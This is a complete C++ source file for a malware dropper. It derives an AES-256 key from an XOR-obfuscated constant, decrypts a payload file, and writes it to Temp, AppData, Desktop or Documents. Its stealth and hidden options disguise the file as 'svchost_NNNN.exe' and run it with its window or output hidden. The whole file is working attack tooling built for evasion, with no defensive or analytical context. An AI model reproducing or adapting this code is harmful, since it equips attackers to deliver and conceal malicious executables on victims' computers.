#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <random>
#include <openssl/evp.h>

#ifdef _WIN32
#include <windows.h>
#include <shellapi.h>
#include <shlobj.h>
#include <tlhelp32.h>
#else
#include <cstdlib>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/stat.h>
#endif

constexpr uint8_t XOR_OBFUSCATE_KEY = 0x5A;

uint8_t encKey[] = { 0x39,0x39,0x08,0x0F,0x0F,0x38,0x08,0x31,0x38,0x32,0x38 };
constexpr size_t keyLen = sizeof(encKey);

inline void decryptKey(uint8_t* keyBuf) {
    for (size_t i = 0; i < keyLen; ++i) {
        keyBuf[i] = encKey[i] ^ XOR_OBFUSCATE_KEY;
    }
}

// AES-256 key and IV
uint8_t aesKey[32];
uint8_t aesIV[16];

void initializeAES() {
    uint8_t key[keyLen];
    decryptKey(key);
    
    for (int i = 0; i < 32; i++) {
        aesKey[i] = key[i % keyLen] ^ (i * 0x37);
    }
    for (int i = 0; i < 16; i++) {
        aesIV[i] = key[i % keyLen] ^ (i * 0x73);
    }
}

bool decryptAES(const std::vector<uint8_t>& input, std::vector<uint8_t>& output) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return false;

    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, aesKey, aesIV) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    output.resize(input.size());
    int outLen;
    
    if (EVP_DecryptUpdate(ctx, output.data(), &outLen, input.data(), input.size()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    int finalLen;
    if (EVP_DecryptFinal_ex(ctx, output.data() + outLen, &finalLen) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    output.resize(outLen + finalLen);
    EVP_CIPHER_CTX_free(ctx);
    return true;
}

std::string generateRandomFilename() {
    static std::random_device rd;
    static std::mt19937 gen(rd());
    static std::uniform_int_distribution<> dis(1000, 9999);
    
    std::string filename = "svchost_" + std::to_string(dis(gen)) + ".exe";
    return filename;
}

std::string getDropLocation(int locationType) {
#ifdef _WIN32
    char path[MAX_PATH];
    
    switch (locationType) {
        case 0: // Temp directory
            GetTempPathA(MAX_PATH, path);
            break;
        case 1: // AppData Local
            SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path);
            break;
        case 2: // AppData Roaming
            SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path);
            break;
        case 3: // Desktop
            SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, path);
            break;
        case 4: // Documents
            SHGetFolderPathA(NULL, CSIDL_MYDOCUMENTS, NULL, 0, path);
            break;
        default:
            GetTempPathA(MAX_PATH, path);
            break;
    }
    
    return std::string(path);
#else
    const char* tempDir = getenv("TMPDIR");
    if (!tempDir) tempDir = getenv("TMP");
    if (!tempDir) tempDir = "/tmp";
    return std::string(tempDir) + "/";
#endif
}

bool dropFile(const std::vector<uint8_t>& data, int locationType = 0, bool stealth = false) {
    std::string dropPath = getDropLocation(locationType);
    std::string filename = stealth ? generateRandomFilename() : "dropped_payload.exe";
    std::string fullPath = dropPath + filename;
    
    // Write file
    std::ofstream outFile(fullPath, std::ios::binary);
    if (!outFile) {
        std::cerr << "Failed to create file: " << fullPath << std::endl;
        return false;
    }
    
    outFile.write(reinterpret_cast<const char*>(data.data()), data.size());
    outFile.close();
    
    // Set executable permissions (Unix/Linux)
#ifndef _WIN32
    chmod(fullPath.c_str(), 0755);
#endif
    
    if (!stealth) {
        std::cout << "File dropped to: " << fullPath << std::endl;
    }
    
    return true;
}

bool executeFile(const std::string& filePath, bool hidden = false) {
#ifdef _WIN32
    SHELLEXECUTEINFOA sei = { sizeof(sei) };
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.lpFile = filePath.c_str();
    sei.nShow = hidden ? SW_HIDE : SW_SHOW;
    
    if (!ShellExecuteExA(&sei) || !sei.hProcess) {
        std::cerr << "Failed to execute file: " << filePath << std::endl;
        return false;
    }
    
    // Wait for execution to complete
    WaitForSingleObject(sei.hProcess, INFINITE);
    CloseHandle(sei.hProcess);
    
    return true;
#else
    pid_t pid = fork();
    if (pid == 0) {
        // Child process
        if (hidden) {
            // Redirect output to /dev/null for hidden execution
            freopen("/dev/null", "w", stdout);
            freopen("/dev/null", "w", stderr);
        }
        execl(filePath.c_str(), filePath.c_str(), nullptr);
        exit(1);
    } else if (pid > 0) {
        // Parent process
        int status;
        waitpid(pid, &status, 0);
        return true;
    } else {
        std::cerr << "Failed to execute file: " << filePath << std::endl;
        return false;
    }
#endif
}

bool dropAndExecute(const std::vector<uint8_t>& data, int locationType = 0, bool stealth = false, bool hidden = false) {
    std::string dropPath = getDropLocation(locationType);
    std::string filename = stealth ? generateRandomFilename() : "dropped_payload.exe";
    std::string fullPath = dropPath + filename;
    
    // Drop the file
    if (!dropFile(data, locationType, stealth)) {
        return false;
    }
    
    // Execute the file
    if (!executeFile(fullPath, hidden)) {
        return false;
    }
    
    // Clean up if not stealth mode
    if (!stealth) {
#ifdef _WIN32
        DeleteFileA(fullPath.c_str());
#else
        unlink(fullPath.c_str());
#endif
    }
    
    return true;
}

void listDropLocations() {
    std::cout << "Available drop locations:\n";
    std::cout << "0 - Temp directory\n";
    std::cout << "1 - AppData Local\n";
    std::cout << "2 - AppData Roaming\n";
    std::cout << "3 - Desktop\n";
    std::cout << "4 - Documents\n";
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cout << "File Dropper - AES Encrypted Payload Executor\n";
        std::cout << "Usage:\n";
        std::cout << "  filedropper.exe <encrypted_file> [options]\n";
        std::cout << "  filedropper.exe --locations\n";
        std::cout << "\nOptions:\n";
        std::cout << "  --location <0-4>    Drop location (0=temp, 1=local, 2=roaming, 3=desktop, 4=documents)\n";
        std::cout << "  --stealth          Use random filename and don't show path\n";
        std::cout << "  --hidden           Execute in hidden mode\n";
        std::cout << "  --no-execute       Only drop file, don't execute\n";
        std::cout << "  --locations        List available drop locations\n";
        return 1;
    }

    if (std::string(argv[1]) == "--locations") {
        listDropLocations();
        return 0;
    }

    initializeAES();

    // Parse command line arguments
    std::string encryptedFile = argv[1];
    int locationType = 0;
    bool stealth = false;
    bool hidden = false;
    bool noExecute = false;

    for (int i = 2; i < argc; i++) {
        std::string arg = argv[i];
        if (arg == "--location" && i + 1 < argc) {
            locationType = std::stoi(argv[++i]);
        } else if (arg == "--stealth") {
            stealth = true;
        } else if (arg == "--hidden") {
            hidden = true;
        } else if (arg == "--no-execute") {
            noExecute = true;
        }
    }

    // Read encrypted file
    std::ifstream fin(encryptedFile, std::ios::binary);
    if (!fin) {
        std::cerr << "Failed to open encrypted file: " << encryptedFile << std::endl;
        return 1;
    }

    fin.seekg(0, std::ios::end);
    size_t fileSize = fin.tellg();
    fin.seekg(0, std::ios::beg);

    std::vector<uint8_t> encryptedData(fileSize);
    fin.read(reinterpret_cast<char*>(encryptedData.data()), fileSize);

    // Decrypt data
    std::vector<uint8_t> decryptedData;
    if (!decryptAES(encryptedData, decryptedData)) {
        std::cerr << "Decryption failed." << std::endl;
        return 1;
    }

    if (!stealth) {
        std::cout << "Decryption successful. Size: " << decryptedData.size() << " bytes" << std::endl;
    }

    // Drop and optionally execute
    if (noExecute) {
        if (!dropFile(decryptedData, locationType, stealth)) {
            std::cerr << "Failed to drop file." << std::endl;
            return 1;
        }
        if (!stealth) {
            std::cout << "File dropped successfully." << std::endl;
        }
    } else {
        if (!dropAndExecute(decryptedData, locationType, stealth, hidden)) {
            std::cerr << "Failed to drop and execute file." << std::endl;
            return 1;
        }
        if (!stealth) {
            std::cout << "File dropped and executed successfully." << std::endl;
        }
    }

    return 0;
}